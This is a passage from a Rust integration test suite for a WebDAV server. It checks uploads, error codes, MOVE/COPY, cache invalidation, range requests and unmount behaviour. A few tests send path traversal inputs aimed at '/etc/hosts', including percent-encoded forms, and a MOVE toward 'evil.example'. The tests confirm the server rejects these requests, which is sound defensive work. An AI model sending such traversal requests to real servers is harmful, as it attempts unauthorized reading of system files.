}

/// A writable file in a folder where new files cannot be created: the upload is
/// written in place, but only after the whole body arrived.
#[cfg(unix)]
#[tokio::test]
async fn webdav_live_put_in_locked_folder_writes_in_place() {
    if unsafe { libc::geteuid() } == 0 {
        return;
    }
    use std::os::unix::fs::PermissionsExt;
    let l = live().await;
    let dir = l.root.join("locked");
    std::fs::create_dir_all(&dir).unwrap();
    let f = dir.join("data.json");
    std::fs::write(&f, b"{\"v\":1}").unwrap();
    std::fs::set_permissions(&f, std::fs::Permissions::from_mode(0o666)).unwrap();
    std::fs::set_permissions(&dir, std::fs::Permissions::from_mode(0o555)).unwrap();

    // Truncated body: the file keeps its content.
    let mut c = Client::connect(l.port).await;
    c.send(
        format!(
            "PUT {}locked/data.json HTTP/1.1\r\n{}Content-Length: 50\r\n\r\n{{\"v\":",
            l.base,
            host(l.port)
        )
        .as_bytes(),
    )
    .await;
    c.stream.shutdown().await.unwrap();
    let _ = c.response(false).await;
    tokio::time::sleep(Duration::from_millis(100)).await;
    assert_eq!(std::fs::read(&f).unwrap(), b"{\"v\":1}");

    // Complete body: written in place.
    let mut c = Client::connect(l.port).await;
    let r = c
        .req(&format!(
            "PUT {}locked/data.json HTTP/1.1\r\n{}Content-Length: 7\r\n\r\n{{\"v\":2}}",
            l.base,
            host(l.port)
        ))
        .await;
    assert_eq!(r.status, 204);
    assert_eq!(std::fs::read(&f).unwrap(), b"{\"v\":2}");
    std::fs::set_permissions(&dir, std::fs::Permissions::from_mode(0o755)).unwrap();
}

#[tokio::test]
async fn webdav_live_errors_are_propagated() {
    let l = live().await;
    let mut c = Client::connect(l.port).await;
    std::fs::create_dir_all(l.root.join("existing")).unwrap();

    let r = c
        .req(&format!(
            "MKCOL {}existing HTTP/1.1\r\n{}\r\n",
            l.base,
            host(l.port)
        ))
        .await;
    assert_eq!(r.status, 405);
    let r = c
        .req(&format!(
            "MKCOL {}Nova%20Pasta HTTP/1.1\r\n{}\r\n",
            l.base,
            host(l.port)
        ))
        .await;
    assert_eq!(r.status, 201);
    assert!(l.root.join("Nova Pasta").is_dir());

    let r = c
        .req(&format!(
            "DELETE {}missing.txt HTTP/1.1\r\n{}\r\n",
            l.base,
            host(l.port)
        ))
        .await;
    assert_eq!(r.status, 404);
    let r = c
        .req(&format!(
            "DELETE {} HTTP/1.1\r\n{}\r\n",
            l.base,
            host(l.port)
        ))
        .await;
    assert_eq!(r.status, 403, "the share root is never deleted");
    assert!(l.root.is_dir());
    let r = c
        .req(&format!(
            "DELETE {}Nova%20Pasta/ HTTP/1.1\r\n{}\r\n",
            l.base,
            host(l.port)
        ))
        .await;
    assert_eq!(r.status, 204);
    assert!(!l.root.join("Nova Pasta").exists());

    let r = c
        .req(&format!(
            "GET {}nope.txt HTTP/1.1\r\n{}\r\n",
            l.base,
            host(l.port)
        ))
        .await;
    assert_eq!(r.status, 404);
    let r = c
        .req(&format!(
            "PROPFIND {}nope/ HTTP/1.1\r\n{}Depth: 1\r\n\r\n",
            l.base,
            host(l.port)
        ))
        .await;
    assert_eq!(r.status, 404);
    let r = c
        .req(&format!("POST {} HTTP/1.1\r\n{}\r\n", l.base, host(l.port)))
        .await;
    assert_eq!(r.status, 405);

    // Path traversal never leaves the share.
    for p in [
        format!("{}../../etc/hosts", l.base),
        format!("{}%2E%2E/%2E%2E/etc/hosts", l.base),
        format!("{}a%2F..%2F..%2Fx", l.base),
    ] {
        let mut c = Client::connect(l.port).await;
        let r = c
            .req(&format!("GET {} HTTP/1.1\r\n{}\r\n", p, host(l.port)))
            .await;
        assert!(matches!(r.status, 400 | 403 | 404), "{p} -> {}", r.status);
    }

    // Writes into a read-only folder report 403 instead of a fake success.
    #[cfg(unix)]
    if unsafe { libc::geteuid() } != 0 {
        use std::os::unix::fs::PermissionsExt;
        let ro = l.root.join("ro");
        std::fs::create_dir_all(&ro).unwrap();
        std::fs::set_permissions(&ro, std::fs::Permissions::from_mode(0o555)).unwrap();
        let mut c = Client::connect(l.port).await;
        let r = c
            .req(&format!(
                "PUT {}ro/x.txt HTTP/1.1\r\n{}Content-Length: 2\r\n\r\nhi",
                l.base,
                host(l.port)
            ))
            .await;
        assert_eq!(r.status, 403);
        let r = c
            .req(&format!(
                "MKCOL {}ro/sub HTTP/1.1\r\n{}\r\n",
                l.base,
                host(l.port)
            ))
            .await;
        assert_eq!(r.status, 403);
        // Nothing is served from cache for the failed write.
        let r = c
            .req(&format!(
                "GET {}ro/x.txt HTTP/1.1\r\n{}\r\n",
                l.base,
                host(l.port)
            ))
            .await;
        assert_eq!(r.status, 404);
        std::fs::set_permissions(&ro, std::fs::Permissions::from_mode(0o755)).unwrap();
    }
}

#[tokio::test]
async fn webdav_live_move_and_copy() {
    let l = live().await;
    let mut c = Client::connect(l.port).await;
    std::fs::write(l.root.join("a.txt"), b"AAA").unwrap();
    std::fs::write(l.root.join("b.txt"), b"BBB").unwrap();
    std::fs::create_dir_all(l.root.join("dir/sub")).unwrap();
    std::fs::write(l.root.join("dir/sub/deep.txt"), b"deep").unwrap();
    std::fs::write(l.root.join("dir/top.txt"), b"top").unwrap();
    let abs = format!("http://127.0.0.1:{}{}", l.port, l.base);

    // Overwrite: F onto an existing file.
    let r = c
        .req(&format!(
            "MOVE {}a.txt HTTP/1.1\r\n{}Destination: {}b.txt\r\nOverwrite: F\r\n\r\n",
            l.base,
            host(l.port),
            abs
        ))
        .await;
    assert_eq!(r.status, 412);
    assert_eq!(std::fs::read(l.root.join("b.txt")).unwrap(), b"BBB");

    // MOVE to an accented name.
    let r = c
        .req(&format!(
            "MOVE {}a.txt HTTP/1.1\r\n{}Destination: {}Relat%C3%B3rio%20(final).txt\r\n\r\n",
            l.base,
            host(l.port),
            abs
        ))
        .await;
    assert_eq!(r.status, 201);
    assert!(!l.root.join("a.txt").exists());
    assert_eq!(
        std::fs::read(l.root.join("Relatório (final).txt")).unwrap(),
        b"AAA"
    );

    // MOVE over an existing file (Overwrite: T default) replaces it.
    let r = c
        .req(&format!(
            "MOVE {}Relat%C3%B3rio%20(final).txt HTTP/1.1\r\n{}Destination: {}b.txt\r\n\r\n",
            l.base,
            host(l.port),
            l.base
        ))
        .await;
    assert_eq!(r.status, 204);
    assert_eq!(std::fs::read(l.root.join("b.txt")).unwrap(), b"AAA");

    // Recursive COPY of a folder.
    let r = c
        .req(&format!(
            "COPY {}dir/ HTTP/1.1\r\n{}Destination: {}copia/\r\n\r\n",
            l.base,
            host(l.port),
            abs
        ))
        .await;
    assert_eq!(r.status, 201);
    assert_eq!(
        std::fs::read(l.root.join("copia/sub/deep.txt")).unwrap(),
        b"deep"
    );
    assert_eq!(std::fs::read(l.root.join("copia/top.txt")).unwrap(), b"top");
    assert!(l.root.join("dir/sub/deep.txt").exists());

    // COPY onto itself / into itself and to another server are refused.
    let r = c
        .req(&format!(
            "COPY {}dir/ HTTP/1.1\r\n{}Destination: {}dir/sub/x/\r\n\r\n",
            l.base,
            host(l.port),
            abs
        ))
        .await;
    assert_eq!(r.status, 403);
    let r = c
        .req(&format!(
            "MOVE {}b.txt HTTP/1.1\r\n{}Destination: http://evil.example{}x.txt\r\n\r\n",
            l.base,
            host(l.port),
            l.base
        ))
        .await;
    assert_eq!(r.status, 502);
    let r = c
        .req(&format!(
            "MOVE {}missing.txt HTTP/1.1\r\n{}Destination: {}y.txt\r\n\r\n",
            l.base,
            host(l.port),
            l.base
        ))
        .await;
    assert_eq!(r.status, 404);
}

#[tokio::test]
async fn webdav_live_cache_freshness() {
    let l = live().await;
    let mut c = Client::connect(l.port).await;
    let f = l.root.join("config.php");
    std::fs::write(&f, b"v1").unwrap();
    let get = format!("GET {}config.php HTTP/1.1\r\n{}\r\n", l.base, host(l.port));
    assert_eq!(c.req(&get).await.body, b"v1");
    assert_eq!(c.req(&get).await.body, b"v1");

    // Edited on the server (e.g. over SSH): different size.
    std::fs::write(&f, b"version 2").unwrap();
    assert_eq!(c.req(&get).await.body, b"version 2");

    // Same size, newer mtime.
    std::fs::write(&f, b"version 3").unwrap();
    let file = std::fs::OpenOptions::new().write(true).open(&f).unwrap();
    file.set_modified(std::time::SystemTime::now() + Duration::from_secs(10))
        .unwrap();
    drop(file);
    assert_eq!(c.req(&get).await.body, b"version 3");

    // Deleted and recreated through WebDAV: never the stale copy.
    let r = c
        .req(&format!(
            "DELETE {}config.php HTTP/1.1\r\n{}\r\n",
            l.base,
            host(l.port)
        ))
        .await;
    assert_eq!(r.status, 204);
    assert_eq!(c.req(&get).await.status, 404);
}

#[tokio::test]
async fn webdav_live_delete_and_move_drop_cached_content() {
    let l = live().await;
    let mut c = Client::connect(l.port).await;
    // Same size and mtime everywhere: only invalidation (not the freshness
    // check) can tell the old cached content from the new one.
    let stamp = std::time::SystemTime::UNIX_EPOCH + Duration::from_secs(1_700_000_000);
    let write = |name: &str, body: &[u8]| {
        let p = l.root.join(name);
        std::fs::write(&p, body).unwrap();
        let f = std::fs::OpenOptions::new().write(true).open(&p).unwrap();
        f.set_modified(stamp).unwrap();
    };
    let get = |name: &str| format!("GET {}{} HTTP/1.1\r\n{}\r\n", l.base, name, host(l.port));
    write("a.txt", b"AAA");
    write("b.txt", b"BBB");
    assert_eq!(c.req(&get("a.txt")).await.body, b"AAA");
    assert_eq!(c.req(&get("b.txt")).await.body, b"BBB");

    // MOVE over a cached destination: the destination shows the moved content.
    let r = c
        .req(&format!(
            "MOVE {}a.txt HTTP/1.1\r\n{}Destination: {}b.txt\r\n\r\n",
            l.base,
            host(l.port),
            l.base
        ))
        .await;
    assert_eq!(r.status, 204);
    assert_eq!(c.req(&get("b.txt")).await.body, b"AAA");
    assert_eq!(c.req(&get("a.txt")).await.status, 404);

    // Source path recreated outside WebDAV with the same stamp: never the old copy.
    write("a.txt", b"ZZZ");
    assert_eq!(c.req(&get("a.txt")).await.body, b"ZZZ");

    // DELETE, then the same name/size/mtime appears again on the server.
    let r = c
        .req(&format!(
            "DELETE {}b.txt HTTP/1.1\r\n{}\r\n",
            l.base,
            host(l.port)
        ))
        .await;
    assert_eq!(r.status, 204);
    write("b.txt", b"CCC");
    assert_eq!(c.req(&get("b.txt")).await.body, b"CCC");
}

#[tokio::test]
async fn webdav_live_large_file_streams_ranges() {
    let l = live().await;
    let size = (CACHE_MAX_FILE + 3 * 1024 * 1024 + 17) as usize;
    let data: Vec<u8> = (0..size).map(|i| (i % 251) as u8).collect();
    std::fs::write(l.root.join("video.mp4"), &data).unwrap();
    let mut c = Client::connect(l.port).await;

    let start = size - 1000;
    let r = c
        .req(&format!(
            "GET {}video.mp4 HTTP/1.1\r\n{}Range: bytes={}-{}\r\n\r\n",
            l.base,
            host(l.port),
            start,
            start + 99
        ))
        .await;
    assert_eq!(r.status, 206);
    assert_eq!(r.body, &data[start..start + 100]);
    assert_eq!(r.headers.get("content-type").unwrap(), "video/mp4");

    let r = c
        .req(&format!(
            "GET {}video.mp4 HTTP/1.1\r\n{}\r\n",
            l.base,
            host(l.port)
        ))
        .await;
    assert_eq!(r.status, 200);
    assert_eq!(r.body.len(), size);
    assert!(r.body == data);
}

#[tokio::test]
async fn webdav_live_appledouble_files_stay_in_memory() {
    let l = live().await;
    let mut c = Client::connect(l.port).await;
    let r = c
        .req(&format!(
            "PUT {}._photo.jpg HTTP/1.1\r\n{}Content-Length: 4\r\n\r\nxatt",
            l.base,
            host(l.port)
        ))
        .await;
    assert_eq!(r.status, 201);
    assert!(!l.root.join("._photo.jpg").exists());
    let r = c
        .req(&format!(
            "GET {}._photo.jpg HTTP/1.1\r\n{}\r\n",
            l.base,
            host(l.port)
        ))
        .await;
    assert_eq!(r.status, 200);
    assert_eq!(r.body, b"xatt");
    let r = c
        .req(&format!(
            "PROPFIND {}._photo.jpg HTTP/1.1\r\n{}Depth: 0\r\n\r\n",
            l.base,
            host(l.port)
        ))
        .await;
    assert_eq!(r.status, 207);
    let r = c
        .req(&format!(
            "LOCK {}._photo.jpg HTTP/1.1\r\n{}Content-Length: 0\r\n\r\n",
            l.base,
            host(l.port)
        ))
        .await;
    assert_eq!(r.status, 200);
    let r = c
        .req(&format!(
            "DELETE {}._photo.jpg HTTP/1.1\r\n{}\r\n",
            l.base,
            host(l.port)
        ))
        .await;
    assert_eq!(r.status, 204);
    let r = c
        .req(&format!(
            "GET {}._photo.jpg HTTP/1.1\r\n{}\r\n",
            l.base,
            host(l.port)
        ))
        .await;
    assert_eq!(r.status, 404);
}

#[tokio::test]
async fn webdav_live_unmount_closes_keepalive_connections() {
    let mut l = live().await;
    let mut c = Client::connect(l.port).await;
    let r = c
        .req(&format!(
            "PROPFIND {} HTTP/1.1\r\n{}Depth: 0\r\n\r\n",
            l.base,
            host(l.port)
        ))
        .await;
    assert_eq!(r.status, 207);
    l.server.unmount_and_stop().await.unwrap();
    assert!(!l.server.is_active());
    // The idle keep-alive connection is closed right away, not after 30 s.
    let mut tmp = [0u8; 16];
    let n = tokio::time::timeout(Duration::from_secs(3), c.stream.read(&mut tmp))
        .await
        .expect("connection still open after unmount")
        .unwrap_or(0);
    assert_eq!(n, 0);
    // And no new connection is accepted.
    tokio::time::sleep(Duration::from_millis(100)).await;
    let refused = match TcpStream::connect(("127.0.0.1", l.port)).await {
        Err(_) => true,
        Ok(mut s) => {
            let _ = s
                .write_all(format!("OPTIONS / HTTP/1.1\r\n{}\r\n", host(l.port)).as_bytes())
                .await;
            matches!(
                tokio::time::timeout(Duration::from_secs(2), s.read(&mut tmp)).await,
                Ok(Ok(0)) | Ok(Err(_))
            )
        }
    };
    assert!(refused);
}
